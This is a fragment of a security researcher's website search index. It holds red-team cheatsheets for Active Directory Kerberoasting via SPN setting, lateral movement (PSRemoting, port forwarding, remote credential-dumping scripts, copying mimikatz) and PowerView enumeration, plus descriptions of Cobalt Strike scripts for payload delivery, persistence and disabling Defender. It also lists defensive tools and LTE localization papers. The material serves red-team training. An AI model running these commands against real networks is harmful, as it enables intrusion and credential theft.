(Set SPN) With enough rights (GenericAll/GenericWrite), a target user’s SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.\nLet’s enumerate the permissions for RDPUsers on ACLs\n# PowerView Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \u0026#34;RDPUsers\u0026#34;} Check if the user already has a SPN:\n# PowerView_dev Get-DomainUser -Identity \u0026#34;STUDENT2\u0026#34; | select ServicePrincipalName # ActiveDirectory Module Get-ADUser -Identity \u0026#34;STUDENT2\u0026#34; -Properties ServicePrincipalName | select ServicePrincipalName Set a SPN for the user (must be unique for the domain):\n# PowerView Set-DomainObject -Identity \u0026#34;STUDENT2\u0026#34; -Set @{serviceprincipalname=\u0026#39;ops/whatever1\u0026#39;} # ActiveDirectory Module Set-ADUser -Identity \u0026#34;STUDENT2\u0026#34; -ServicePrincipalNames @{Add=\u0026#39;ops/whatever1\u0026#39;} Request a TGS:\n# PowerShell Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;ops/whatever1\u0026#34; # PowerView …","date":1659225600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1659225600,"objectID":"381c01d401294235df85592b90ed62e8","permalink":"https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/","publishdate":"2022-07-31T00:00:00Z","relpermalink":"/post/0020-domain-privilege-escalation-cheatsheet/","section":"post","summary":"Once an adversary has gained an initial foothold in the network, they will seek to escalate their privileges and compromise additional systems to locate sensitive data and other critical resources.","tags":["Cheatsheet","Red Teaming","Windows","Active Directory","Privilege Escalation"],"title":"Domain Privilege Escalation cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Local Files Find local senstive files on computers:\n# PowerView Get-ChildItem -Filter *.xml -Path c:\\ -RecurseGet-ChildItem -Filter *unattend*.xml -Path c:\\ -Recurse AppLocker Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at LOLBAS if only signed binaries are allowed:\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Port Scanning Check machine reachability:\nTest-NetConnection \u0026#34;COMPUTER1\u0026#34; -Port 3389 Perform a port scanning:\n# PowerSploit ## Open and filtered ports Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -TopPorts 200 | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;--- FILTERED ---\u0026#34;; echo $_.filteredPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -Ports \u0026#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901\u0026#34; | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;--- FILTERED ---\u0026#34;; echo $_.filteredPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} ## Only open ports Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -TopPorts 200 | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;}Invoke-Portscan -Hosts @(Get-NetComputer) -TopPorts 200 | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -Ports \u0026#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901\u0026#34; | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} Invoke-Portscan -Hosts @(Get-NetComputer) -Ports \u0026#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985\u0026#34; | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} ## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24) Port forwarding # Forward a port to another host/port net sh interface portproxy add v4tov4 listenport=80 listenaddress=192.168.1.9 connectport=5985 connectaddress=192.168.1.10 ## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth Set-Item wsman:\\localhost\\Client\\TrustedHosts -value * $securePassword = ConvertTo-SecureString \u0026#34;Password\u0026#34; -AsPlainText -force $credential = New-Object System.Management.Automation.PsCredential(\u0026#34;cyberlab\\STUDENT1\u0026#34;,$securePassword) Enter-PSSession -ComputerName 192.168.1.9 -Port 80 -Credential $securePassword # Show all forwardings netsh interface portproxy show all # Delete all forwardings netsh interface portproxy reset # Delete a specific forwardingnet sh interface portproxy delete v4tov4 listenport=80 listenaddress=192.168.1.9 PSRemoting Requires ‘HTTP’ and ‘WSMAN’ SPNs\nEnable PSRemoting on local machine and adds exception to the firewall:\nEnable-PSRemoting Create a PSSession:\n$sess = New-PSSession -ComputerName \u0026#34;COMPUTER1\u0026#34; -Credential \u0026#34;cyberlab\\STUDENT1\u0026#34; Enter a PSSession:\nEnter-PSSession -ComputerName \u0026#34;COMPUTER1\u0026#34;-Credential \u0026#34;cyberlab\\STUDENT1\u0026#34; -Session $sess Use below to execute commands or scriptblocks:\nInvoke-Command -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) -ScriptBlock {Get-Process} Invoke-Command -ComputerName \u0026#34;COMPUTER1\u0026#34; -ScriptBlock {whoami;hostname} Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):\n$securePassword = ConvertTo-SecureString \u0026#34;Password\u0026#34; -AsPlainText -Force $credential = New-Object System.Management.Automation.PsCredential(\u0026#34;cyberlab\\STUDENT1\u0026#34;,$securePassword) Invoke-Command -ComputerName \u0026#34;COMPUTER1\u0026#34; -ScriptBlock {whoami;hostname} -Credential $credential or to start a new session:\n$Sess = New-PSSession -Computername \u0026#34;COMPUTER1\u0026#34; -Credential $credentialInvoke-Command -Session $sess -ScriptBlock {whoami} Use below to execute scripts from files:\nInvoke-Command -FilePath \u0026#34;C:\\scripts\\Get-PassHashes.ps1\u0026#34; -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) Use below to execute locally loaded function on the remote machines:\nInvoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:\nInvoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) -ArgumentList Execute “Stateful” commands using Invoke-Command:\n$Sess = New-PSSession -Computername \u0026#34;COMPUTER1\u0026#34;Invoke-Command -Session $Sess -ScriptBlock {$Proc = GetProcess}Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name} Copy files between PSRemoting sessions:\n$Sess = New-PSSession -Computername \u0026#34;COMPUTER1\u0026#34; Copy-Item -Path C:\\Users\\Public\\Inveigh-NTLMv2.txt -Destination C:\\Users\\user01\\Desktop\\ -FromSession $sess Copy-Item -Path C:\\Users\\user01\\Desktop\\mimikatz.exe …","date":1658620800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1658620800,"objectID":"44a4343245f8e67ac4def8907bbdaff7","permalink":"https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/","publishdate":"2022-07-24T00:00:00Z","relpermalink":"/post/0010-domain-lateral-movement-cheatsheet/","section":"post","summary":"Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets.","tags":["Cheatsheet","Red Teaming","Windows","Active Directory","Lateral Movement"],"title":"Domain Lateral Movement cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Module Import Load the PowerView module:\npowershell -ep bypass . .\\PowerView.ps1 or the ActiveDirectory module (to use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid Active Directory module DLL):\nImport-Module .\\Microsoft.ActiveDirectory.Management.dll Import-Module .\\ActiveDirectory\\ActiveDirectory.psd1 It works also in case of ConstrainedLanguage Mode:\n$ExecutionContext.SessionState.LanguageMode Basic Enumeration Get current domain or trusted domain objects:\n# PowerView Get-NetDomain Get-NetDomain -Domain \u0026#34;cyberlab.cybercorp.local\u0026#34; Get-NetDomain -Domain \u0026#34;cybercorp.local\u0026#34; ## Test it via getting domain NetBios name (gwmi Win32_NTDomain).DomainName # ActiveDirectory Module Get-ADDomain Get-ADDomain -Identiy \u0026#34;cyberlab.cybercorp.local\u0026#34; Get-ADDomain -Identiy \u0026#34;cybercorp.local\u0026#34; Get domain SID for the current domain:\n# PowerView Get-DomainSID # ActiveDirectory Module (Get-ADDomain).DomainSID Get domain policy for the current domain or for a trusted domain:\n# PowerView Get-DomainPolicy (Get-DomainPolicy).\u0026#34;System Access\u0026#34; (Get-DomainPolicy).\u0026#34;Kerberos Policy\u0026#34; (Get-DomainPolicy -Domain \u0026#34;cybercorp.local\u0026#34;).\u0026#34;System Access\u0026#34; (Get-DomainPolicy -Domain \u0026#34;cybercorp.local\u0026#34;).\u0026#34;Kerberos Policy\u0026#34; Get Domain Controllers for the current or for a trusted domain:\n# PowerView Get-NetDomainController\tGet-NetDomainController\t-Domain \u0026#34;cybercorp.local\u0026#34; # ActiveDirectory Module Get-ADDomainController\tGet-ADDomainController -DomainName \u0026#34;cybercorp.local\u0026#34; -Discover Get the list of users in the current domain:\n# PowerView Get-NetUser Get-NetUser | select -ExpandProperty samaccountname Get-NetUser | select samaccountname,title,description,logoncount,pwdlastset Get-NetUser -Domain \u0026#34;cybercorp.local\u0026#34; | select -ExpandProperty samaccountname Get-NetUser -UserName \u0026#34;STUDENT1\u0026#34; # ActiveDirectory Module Get-ADUser -Filter * -Properties * Get-ADUser -Identity \u0026#34;STUDENT1\u0026#34; -Properties * ::cmd.exe net user /domain net user \u0026#34;STUDENT1\u0026#34; /domain Get list of all properties for users in the current domain:\n# PowerView Get-UserProperty\t# All properties Get-UserProperty -Properties \u0026#34;pwdlastset\u0026#34;\t# Only pwdlastset property # ActiveDirectory Module Get-ADUser -Filter * -Properties * Get-ADUser -Identity \u0026#34;STUDENT1\u0026#34; -Properties * Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType Property | select Name Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}\tSearch for a particular string in a users’ attribute:\n# PowerView Find-UserField -Verbose Find-UserField -SearchField \u0026#34;Description\u0026#34; -SearchTerm \u0026#34;built\u0026#34; # ActiveDirectory Module Get-ADUser -Filter \u0026#39;Description -like \u0026#34;*built*\u0026#34;\u0026#39; -Properties Description | select Name,Description Get a list of computers in the current domain:\n# PowerView Get-NetComputer Get-NetComputer -OperatingSystem \u0026#34;*Server 2016*\u0026#34; Get-NetComputer -Ping Get-NetComputer -FullData ## Get computer IPs Get-NetComputer | % {$name=$_; $ip=[System.Net.Dns]::GetHostAddresses($name).IPAddressToString; Write-Host $name \u0026#34;`t : \u0026#34; $ip } # ActiveDirectory Module Get-ADComputer -Filter * | select Name Get-ADComputer -Filter \u0026#39;OperatingSystem -like \u0026#34;*Server 2016*\u0026#34;\u0026#39; -Properties OperatingSystem | select Name,OperatingSystem Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} Get-ADComputer -Filter * -Properties * Search for a particular string in a computer attribute:\n# PowerView Find-ComputerField -SearchField \u0026#34;OperatingSystem\u0026#34; -SearchTerm \u0026#34;windows\u0026#34;\t# ActiveDirectory Module Get-ADComputer -Filter \u0026#39;Description -like \u0026#34;*built*\u0026#34;\u0026#39; -Properties Description | select name,Description Get groups in the current domain:\n# PowerView Get-NetGroup Get-NetGroup -GroupName \u0026#34;Domain Admins\u0026#34; -FullData Get-NetGroup -GroupName \u0026#34;Enterprise Admins\u0026#34; -FullData Get-NetGroup -GroupName \u0026#34;*admin*\u0026#34; # ActiveDirectory Module Get-ADGroup -Filter * Get-ADGroup -Filter \u0026#39;Name -like \u0026#34;*admin*\u0026#34;\u0026#39; | select Name ::cmd.exe net group /domain net group \u0026#34;Domain Admins\u0026#34; /domain Get all the members of a group:\n# PowerView Get-NetGroupMember -GroupName \u0026#34;Domain Admins\u0026#34; -Recurse Get-NetGroupMember -GroupName \u0026#34;Enterprise Admins\u0026#34; -Recurse # ActiveDirectory Module Get-ADGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recursive\tGet-ADGroupMember -Identity \u0026#34;Enterprise Admins\u0026#34; -Recursive\tGet the group membership for a user:\n# PowerView Get-NetGroup -UserName \u0026#34;STUDENT1\u0026#34;\t# ActiveDirectory Module Get-ADPrincipalGroupMembership -Identity \u0026#34;STUDENT1\u0026#34; Get local groups on localhost or an specified computer (need local admin rights on the target):\n# PowerView Get-NetLocalGroup Get-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; Get-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; -ListGroups\tGet-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; -GroupName \u0026#34;Remote Desktop Users\u0026#34;\t:: cmd.exe net localgroup Get all effective local/domain users/groups that can access the machine with local administrative privileges:\n# PowerView Get-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; -Recurse\tGet currently logged users on a …","date":1658016e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1658016e3,"objectID":"bebede30aad4cefc8f1f1c17ce5ead08","permalink":"https://www.peco602.com/post/0000-domain-enumeration-cheatsheet/","publishdate":"2022-07-17T00:00:00Z","relpermalink":"/post/0000-domain-enumeration-cheatsheet/","section":"post","summary":"Domain enumeration is the process of extracting information from the Active Directory like enumerating the users, groups, and other interesting fields and resources.","tags":["Cheatsheet","Red Teaming","Windows","Active Directory","Enumeration"],"title":"Domain Enumeration cheatsheet","type":"post"},{"authors":null,"categories":null,"content":"What does it do? FindWall is Python script that allows to understand if your network provider is limiting your access to the Internet by blocking any TCP/UDP port. In order to perform this check FindWall needs to connect a public VPS of your property. FindWall performs the following actions:\nConnects to the VPS via SSH Opens a port in listening mode Tries to connect to that port from the local machine Closes the port How do you use it? To use FindWall you just need an account on a public VPS. The account must have root access if you want to test ports in the range 1-1024. The root account is also required to automatically install the tool nc to open ports.\n$ pip install -r requirements $ python findwall.py --help ===================================================================================== ███████╗██╗███╗ ██╗██████╗ ██╗ ██╗ █████╗ ██╗ ██╗ ██╔════╝██║████╗ ██║██╔══██╗██║ ██║██╔══██╗██║ ██║ █████╗ ██║██╔██╗ ██║██║ ██║██║ █╗ ██║███████║██║ ██║ ██╔══╝ ██║██║╚██╗██║██║ ██║██║███╗██║██╔══██║██║ ██║ ██║ ██║██║ ╚████║██████╔╝╚███╔███╔╝██║ ██║███████╗███████╗ ╚═╝ ╚═╝╚═╝ ╚═══╝╚═════╝ ╚══╝╚══╝ ╚═╝ ╚═╝╚══════╝╚══════╝ ===================================================================================== usage: findwall.py [-h] --ssh-host SSH_HOST [--ssh-port SSH_PORT] --ssh-username SSH_USERNAME [--ssh-password SSH_PASSWORD] [--ask-ssh-pass] [--ssh-key SSH_KEY] --ports PORTS [--udp] [--threads THREADS] Check if someone is blocking you! optional arguments: -h, --help show this help message and exit --ssh-host SSH_HOST Remote host --ssh-port SSH_PORT Remote SSH port --ssh-username SSH_USERNAME Remote SSH username --ssh-password SSH_PASSWORD Remote SSH password --ask-ssh-pass Ask for remote SSH password --ssh-key SSH_KEY Remote SSH private key --ports PORTS Port range to scan (default: 1-1024) --udp Scan in UDP --threads THREADS Number of threads (default: 1) As an example:\n$ python findwall.py --ssh-host 172.17.0.2 --ssh-port 22 --ssh-username test --ssh-password test --ports 8000-8010 --threads 3 ","date":1653004800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1653004800,"objectID":"2e93dfc1aa273133e1ae71dbce644806","permalink":"https://www.peco602.com/project/0030-findwall/","publishdate":"2022-05-20T00:00:00Z","relpermalink":"/project/0030-findwall/","section":"project","summary":"FindWall is Python script that allows to understand if your network provider is limiting your access to the Internet by blocking any TCP/UDP port.","tags":["Cyber Security","Python"],"title":"FindWall","type":"project"},{"authors":null,"categories":null,"content":"RustHunter is a modular incident response framework to build and compare environmental baselines. It is written in Rust and uses Ansible to collect data across multiple hosts.\nDue to the following features it can be also employed to perform threat hunting and incident handling:\nMulti-Platform: it is able to collect data from both Windows, Linux and macOS machines; Agentless: the usage of the Ansible technology based on SSH and WinRM allows to overcome the requirement of a local agent waiting for a task to be accomplished; Easily Deployable: it is cross-platform and can be deployed both on premises and in a Cloud-based environment. A Bash and a PowerShell scripts have been developed to execute the tool respectively from a Linux and Windows machine; Easily Expandable: it provides developer-ready Rust specifications offering an easy way to expand the product features by writing custom modules to collect additional machine data. ","date":1652572800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652572800,"objectID":"83e6a41b8724759281c8ceccbdca738f","permalink":"https://www.peco602.com/project/0020-rusthunter/","publishdate":"2022-05-15T00:00:00Z","relpermalink":"/project/0020-rusthunter/","section":"project","summary":"RustHunter is a modular incident response framework to build and compare environmental baselines. It is written in Rust and uses Ansible to collect data across multiple hosts.","tags":["Cyber Security","Blue Teaming","Incident Response","Rust"],"title":"RustHunter","type":"project"},{"authors":["Giovanni Pecoraro","Matteo Merialdo"],"categories":null,"content":"","date":164934e4,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":164934e4,"objectID":"98ec62b9bdf83bea6b1acf47a420f481","permalink":"https://www.peco602.com/talk/cyber-range-for-space-a-way-to-optimize-the-cybersecurity-process/","publishdate":"2022-04-07T00:00:00Z","relpermalink":"/talk/cyber-range-for-space-a-way-to-optimize-the-cybersecurity-process/","section":"event","summary":"Dfferent step regarding the conception of space systems and the implementation of cybersecurity tools.","tags":["Cyber Security","Cyber Range","Space"],"title":"Cyber range for space a way to optimize the cybersecurity process","type":"event"},{"authors":null,"categories":null,"content":"Introduction This is a collection of Cobalt Strike Aggressor scripts I developed and tested while I was a Red Team member for Locked Shields 2021.\nInitial Access Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network.\ninitial-access-cmd/initial-access-cmd.cna:\nCertutil Web Delivery (Custom): Provides a CMD one-liner to deliver a custom executable via Certutil Certutil Web Delivery (Stageless): Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Certutil Bitsadmin Web Delivery (Stageless): Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Bitsadmin Regsvr32 Web Delivery (Stageless): Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Regsvr32 MSHTA Web Delivery (Stageless): Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via MSHTA Rundll32 Web Delivery (Stageless): Provides a CMD one-liner to deliver a stageless Cobalt Strike payload via Rundll32 initial-access-powershell/initial-access-powershell.cna:\nPure Powershell Web Delivery (Stageless): Provides a PowerShell one-liner to deliver (in-memory) a stageless Cobalt Strike PoweShell payload Artifact Powershell Web Delivery (Stageless): Provides a PowerShell one-liner to deliver (in-memory) a PowerShell scripts which embeds a stageless Cobalt Strike payload initial-access-python/initial-access-python.cna:\nPython 2 Web Delivery: Provides a Python 2 one-liner to deliver a stageless Cobalt Strike payload (it assumes the following path for Python 2: c:\\Python27\\pythonw.exe) Python 3 Web Delivery: Provides a Python 3.9 one-liner to deliver a stageless Cobalt Strike payload (it assumes the following path for Python 3.9: C:\\Python39\\pythonw.exe) Persistence Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.\npersistence-sharpersist/persistence-sharpersist.cna: * Startup Folder (Upload executable) [Reboot]: Installs persistence for all users by uploading an executable to the startup folder [Requires administrator privileges] Startup Folder (Upload executable) [Reboot]: Installs persistence for the current user by uploading an executable to the startup folder * Windows Service (Powershell command) [Reboot]: Installs persistence for all users by creating a Windows service launching a PowerShell command [Requires administrator privileges] * Windows Service (Upload executable) [Reboot]: Installs persistence for all users by uploading an executable and creating a Windows service launching it [Requires administrator privileges] * Scheduled Task (Powershell command) [Logon/Hourly]: Installs persistence for all users by creating a Scheduled Task launching a PowerShell command [Requires administrator privileges] * Scheduled Task (Upload executable) [Logon/Hourly]: Installs persistence for all users by uploading an executable and creating a Scheduled Task launching it [Requires administrator privileges] Scheduled Task (Powershell command) [Logon/Hourly]: Installs persistence for the current user by creating a Scheduled Task launching a PowerShell command Scheduled Task (Upload executable) [Logon/Hourly]: Installs persistence for the current user by uploading an executable and creating a Scheduled Task launching it * Registry (Powershell command) [Logon]: Installs persistence for all users by adding a PowerShell command to an autorun registry key [Requires administrator privileges] * Registry (Upload executable) [Logon]: Installs persistence for all users by uploading an executable and adding it to an autorun registry key [Requires administrator privileges] Registry (Powershell command) [Logon]: Installs persistence for the current user by adding a PowerShell command to an autorun registry key [Requires administrator privileges] Registry (Upload executable) [Logon]: Installs persistence for the current user by uploading an executable and adding it to an autorun registry key * Sticky Keys (CMD): Launches a CMD prompt in case of sticky keys or other accessibility tools (e.g., Narrator, Magnifier) execution * Sticky Keys (Beacon): Launches a Cobalt Strike beacon in case of sticky keys or other accessibility tools (e.g., Narrator, Magnifier) execution Defense Evasion Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts.\nevasion-disable-defender/evasion-disable-defender.cna:\n* Disable AV/Firewall: Disables Windows Defender [Requires administrator privileges] * Add Exclusions (Auto): Automatically adds a list of paths and executables to the Windows Defender exclusions [Requires administrator privileges] * Add Exclusions (Custom): Adds a custom path and executable to the Windows Defender exclusions [Requires administrator privileges] …","date":1641168e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1641168e3,"objectID":"8599b103e91fd6b3705d52a4c48ec302","permalink":"https://www.peco602.com/project/0010-cobaltstrike-aggressor-scripts/","publishdate":"2022-01-03T00:00:00Z","relpermalink":"/project/0010-cobaltstrike-aggressor-scripts/","section":"project","summary":"Collection of Cobalt Strike Aggressor scripts I developed and tested while I was a Red Team member for Locked Shields 2021.","tags":["Cyber Security","Cobalt Strike","Aggressor"],"title":"Cobalt Strike Aggressor Scripts","type":"project"},{"authors":["Mario D'Amico","Giovanni Pecoraro","Simon Pietro Romano"],"categories":null,"content":"","date":1636552800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1636552800,"objectID":"763738441b1ce976152ab05211caeec0","permalink":"https://www.peco602.com/talk/redherd-framework/","publishdate":"2021-11-10T14:00:00Z","relpermalink":"/talk/redherd-framework/","section":"event","summary":"RedHerd is a collaborative serverless framework for orchestrating a geographically distributed set of assets in order to simulate/conduct complex offensive cyberspace operations.","tags":["Cyber Security","Red Teaming","Orchestration"],"title":"RedHerd Framework","type":"event"},{"authors":null,"categories":null,"content":"RedHerd is a collaborative and serverless framework for orchestrating a geographically distributed group of assets capable of conducting simulating complex offensive cyberspace operations.\nThe framework takes advantage of the “as a Service” paradigm in order to deploy a ready-to-use infrastructure that can also be adopted for effective training purposes, by reliably reproducing a real-world cyberspace scenario in which red and blue teams can challenge each other. RedHerd perfectly fits the Open Systems Architecture design pattern, thanks to the adoption of both open standards and wide-spread open source software components.\n","date":1626307200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1626307200,"objectID":"ca5fa1726bafad9b8ea149a8b09fc2e9","permalink":"https://www.peco602.com/project/0000-redherd-framework/","publishdate":"2021-07-15T00:00:00Z","relpermalink":"/project/0000-redherd-framework/","section":"project","summary":"RedHerd is a collaborative and serverless framework for orchestrating a geographically distributed group of assets capable of conducting simulating complex offensive cyberspace operations.","tags":["Cyber Security","Red Teaming","Orchestration"],"title":"RedHerd Framework","type":"project"},{"authors":["Giovanni Pecoraro","Mario D'Amico","Simon Pietro Romano"],"categories":null,"content":" ","date":1601510400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1601510400,"objectID":"1f17058ba24ce066ca4ccb7dd452c978","permalink":"https://www.peco602.com/publication/0080-redherd-offensive-operations-service/","publishdate":"2020-10-01T00:00:00Z","relpermalink":"/publication/0080-redherd-offensive-operations-service/","section":"publication","summary":"Nowadays, time, scope and cost constraints along with knowledge requirements and personnel training constitute blocking restrictions for effective Offensive Cyberspace Operations (OCO). This paper presents RedHerd, an open-source, collaborative and serverless orchestration framework that overcomes these limitations. RedHerd leverages the ‘as a Service’ paradigm in order to seamlessly deploy a ready-to-use infrastructure that can be also adopted for effective simulation and training purposes, by reliably reproducing a real-world cyberspace battlefield in which red and blue teams can challenge each other. We discuss both the design and implementation of the proposed solution, by focusing on its main functionality, as well as by highlighting how it perfectly fits the Open Systems Architecture design pattern, thanks to the adoption of both open standards and wide-spread open-source software components. The paper also presents a complete OCO simulation based on the usage of RedHerd to perform a fictitious attack and fully compromise an imaginary enterprise following the Cyber Kill Chain (CKC) phases.","tags":["Cyber Security","Red Teaming","Orchestration"],"title":"RedHerd: Offensive Cyberspace Operations as a Service","type":"publication"},{"authors":["Giovanni Pecoraro","Ernestina Cianca","Simone Di Domenico","Mauro De Sanctis"],"categories":null,"content":" ","date":1582502400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1582502400,"objectID":"29bfa49371e3f43d8085eea893318d6c","permalink":"https://www.peco602.com/publication/0070-lte-fingerprinting-device-free-changing/","publishdate":"2020-02-24T00:00:00Z","relpermalink":"/publication/0070-lte-fingerprinting-device-free-changing/","section":"publication","summary":"This paper proposes a fingerprinting-based device Free Passive localization system based on the use of the LTE signal and it is robust to environment changes. The proposed methodology uses as fingerprints descriptors calculated on the CSI vectors rather than directly CSI vectors. The paper shows the performance of the proposed methods also assuming that the monitored environment might be different from the one characterized during the training phase as some equipment may be moved. Moreover, the paper compares the proposed method with signal fingerprinting approaches based on RSSI or direct CSI vectors. Experimental results, which consider one single LTE receiver in the monitored room, show the effectiveness of the proposed solution.","tags":["Localization","Indoor","Fingerprinting","Device-Free","LTE","Channel State Information"],"title":"LTE Signal Fingerprinting Device-Free Passive Localization in Changing Environments","type":"publication"},{"authors":["Giovanni Pecoraro","Ernestina Cianca","Simone Di Domenico","Mauro De Sanctis"],"categories":null,"content":" ","date":1543104e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1543104e3,"objectID":"68dc6bd0adf0a2c5af11d20d3c7ce993","permalink":"https://www.peco602.com/publication/0060-lte-fingerprinting-device-free-robust/","publishdate":"2018-11-25T00:00:00Z","relpermalink":"/publication/0060-lte-fingerprinting-device-free-robust/","section":"publication","summary":"This paper shows the feasibility of an LTE signal fingerprinting Device Free Passive localization system. The experimental setup considers one single LTE receiver in the monitored room. The paper shows that when ambient signals such as LTE are used, the use of RSSI as fingerprint provides very poor performance. CSI-based approaches demonstrate much better performance. Moreover, the system using CSI shape and statistical descriptors rather than direct CSI vectors is characterized by more stable performance also when the room configuration is changed (i.e., the furniture is moved).","tags":["Localization","Indoor","Fingerprinting","Device-Free","LTE","Channel State Information"],"title":"LTE Signal Fingerprinting Device-Free Passive Localization Robust to Environment Changes","type":"publication"},{"authors":["Giovanni Pecoraro","Simone Di Domenico","Ernestina Cianca","Mauro De Sanctis"],"categories":null,"content":" ","date":1532649600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1532649600,"objectID":"6b61d26bcc2236e8bae37e3386f2cf35","permalink":"https://www.peco602.com/publication/0050-csi-fingerprinting-indoor-lte/","publishdate":"2018-07-27T00:00:00Z","relpermalink":"/publication/0050-csi-fingerprinting-indoor-lte/","section":"publication","summary":"This paper addresses the use of channel state information (CSI) for Long Term Evolution (LTE) signal fingerprinting localization. In particular, the paper proposes a novel CSI-based signal fingerprinting approach, where fingerprints are descriptors of the “shape” of the channel frequency response (CFR) calculated on CSI vectors, rather than direct CSI vectors. Experiments have been carried out to prove the feasibility and the effectiveness of the proposed method and to study the impact on the localization performance of (i) the bandwidth of the available LTE signal and (ii) the availability of more LTE signals transmitted by different eNodeB (cell diversity). Comparisons with other signal fingerprinting approaches, such as the ones based on received signal strength indicator or reference signal received power, clearly show that using LTE CSI, and in particular, descriptors as fingerprints, can bring relevant performance improvement.","tags":["Localization","Indoor","Fingerprinting","Device-Based","LTE","Channel State Information"],"title":"CSI-based fingerprinting for indoor localization using LTE signals","type":"publication"},{"authors":["Giovanni Pecoraro","Simone Di Domenico","Ernestina Cianca","Mauro De Sanctis"],"categories":null,"content":" ","date":1506816e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1506816e3,"objectID":"ff01578bf0c950ee81d4f19a1ab89d37","permalink":"https://www.peco602.com/publication/0040-lte-fingerprinting-localization-csi/","publishdate":"2017-10-01T00:00:00Z","relpermalink":"/publication/0040-lte-fingerprinting-localization-csi/","section":"publication","summary":"This paper investigates the possibility to use Channel State Information (CSI) extracted from Long Term Evolution (LTE) signals for signal fingerprinting localization. Being the first work in this direction, several types of signal fingerprinting-based approaches have been compared (e.g., CSI-based vs 